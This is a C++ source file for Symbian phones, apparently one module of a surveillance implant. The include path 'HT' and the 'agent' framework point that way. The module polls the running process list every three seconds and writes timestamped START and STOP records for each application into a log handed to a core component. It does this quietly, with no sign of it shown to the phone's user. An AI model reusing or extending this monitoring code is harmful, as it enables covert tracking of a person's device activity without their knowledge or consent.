/*
 * AgentApplication.cpp
 *
 *  Created on: 24/set/2010
 *      Author: Giovanna
 */

#include "AgentApplication.h"
#include <HT\LogFile.h>

_LIT(KStart,"START");
_LIT(KStop,"STOP");

CAgentApplication::CAgentApplication() :
	CAbstractAgent(EAgent_Application),iSecondsInterv(3),iOldList(1,_FOFF(TProcItem,pUid)),iNewList(1,_FOFF(TProcItem,pUid))
	{
	// No implementation required
	}

CAgentApplication::~CAgentApplication()
	{
	__FLOG(_L("Destructor"));
	delete iTimer;
	iOldList.Close();
	iNewList.Close();
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CAgentApplication* CAgentApplication::NewLC(const TDesC8& params)
	{
	CAgentApplication* self = new (ELeave) CAgentApplication();
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CAgentApplication* CAgentApplication::NewL(const TDesC8& params)
	{
	CAgentApplication* self = CAgentApplication::NewLC(params);
	CleanupStack::Pop();
	return self;
	}

void CAgentApplication::ConstructL(const TDesC8& params)
	{
	BaseConstructL(params);
	__FLOG_OPEN("HT", "Agent_Application.txt");
	__FLOG(_L("-------------"));
	iTimer = CTimeOutTimer::NewL(*this);
	}

void CAgentApplication::StartAgentCmdL()
	{
	__FLOG(_L("StartAgentCmdL()"));
	
	CreateLogL(LOGTYPE_APPLICATION);  //this is an ongoing module, close log on stop	
		
	// reset process list
	iOldList.Reset();

	// retrieve first process list
	TProcItem procItem;
	TFullName res;
	TFindProcess proc;
	while(proc.Next(res) == KErrNone)
		{
		RProcess ph;
		TInt err = ph.Open(proc);
		if(err!=KErrNone)
			{
			continue;
		    }
		procItem.pUid = ph.Id().Id();
		procItem.name.Copy(ph.Name());
		iOldList.InsertInUnsignedKeyOrder(procItem);
		ph.Close();
		}
	
	TTime time;
	time.HomeTime();
	time += iSecondsInterv;        
	iTimer->CustomAt(time);
	}

void CAgentApplication::StopAgentCmdL()
	{
	__FLOG(_L("StopAgentCmdL()"));
		
	iTimer->Cancel();
	CloseLogL();
	}

void CAgentApplication::CycleAgentCmdL()
	{
	CycleLogL(LOGTYPE_APPLICATION);
	}


void CAgentApplication::TimerExpiredL(TAny* src)
	{
	
	HBufC8* tmp = GetListBufferL();
	CleanupStack::PushL(tmp);
	TInt value;
	RProperty::Get(KPropertyUidCore, KPropertyFreeSpaceThreshold, value);
	if(value)
		{
		if(tmp->Des().Length()>0)
			{
			AppendLogL(*tmp);
			}
		}
	CleanupStack::PopAndDestroy(tmp);
	
	SwapLists();

	TTime time;
	time.HomeTime();
	time += iSecondsInterv;              
	iTimer->CustomAt(time);
			 
	}


void CAgentApplication::SwapLists()
	{
	iOldList.Reset();
	TInt count = iNewList.Count();
	
	iOldList.Reserve(count);
	//Mem::Copy(&iOldList,&(iNewList[0]),sizeof(TProcItem)*count);
	for(TInt i = 0; i < count; i++)
		iOldList.Append(iNewList[i]);
	}

HBufC8* CAgentApplication::GetListBufferL(void)
	{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);

	// get timestamp
	TTimestamp tstamp;
	TimeUtils::GetTimestamp(&tstamp);
	
	// reset array
	iNewList.Reset();
	
	TUint16 null = 0;
	TUint32 delimiter = LOG_DELIMITER;
		
	// retrieve new process list and check if new proc have been started
	TProcItem procItem;
	TFullName res;
	TFindProcess proc;
	while(proc.Next(res) == KErrNone)
		{
		RProcess ph;
		TInt err = ph.Open(proc);
		if(err!=KErrNone)
			{
			continue;
			}
		procItem.pUid = ph.Id().Id();
		procItem.name.Copy(ph.Name());
		iNewList.InsertInUnsignedKeyOrder(procItem);
		if(iOldList.FindInUnsignedKeyOrder(procItem) == KErrNotFound)
			{
			// this is a new proc
			buffer->InsertL(buffer->Size(),&tstamp,sizeof(TTimestamp));
			buffer->InsertL(buffer->Size(),procItem.name.Ptr(),procItem.name.Size());
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // null termination for name
			buffer->InsertL(buffer->Size(),KStart().Ptr(),KStart().Size());
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16));  // null termination for start
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // description set to null
			buffer->InsertL(buffer->Size(),(TUint8 *)&delimiter,sizeof(TUint32));
			}
		ph.Close();
		}

	// now let's search for stopped processes
	TInt count = iOldList.Count();
	for(TInt i=0; i< count; i++)
		{
		if(iNewList.FindInUnsignedKeyOrder(iOldList[i]) == KErrNotFound)
			{
			// proc has been stopped
			buffer->InsertL(buffer->Size(),&tstamp,sizeof(TTimestamp));
			buffer->InsertL(buffer->Size(),iOldList[i].name.Ptr(),iOldList[i].name.Size());
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // null termination for name
			buffer->InsertL(buffer->Size(),KStop().Ptr(),KStop().Size());
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // null termination for STOP
			buffer->InsertL(buffer->Size(),(TUint8 *)&null,sizeof(TUint16)); // description set to null
			buffer->InsertL(buffer->Size(),(TUint8 *)&delimiter,sizeof(TUint32));
			}
		}
	
	HBufC8* result = buffer->Ptr(0).AllocL();
	
	CleanupStack::PopAndDestroy(buffer);
	return result;
	}

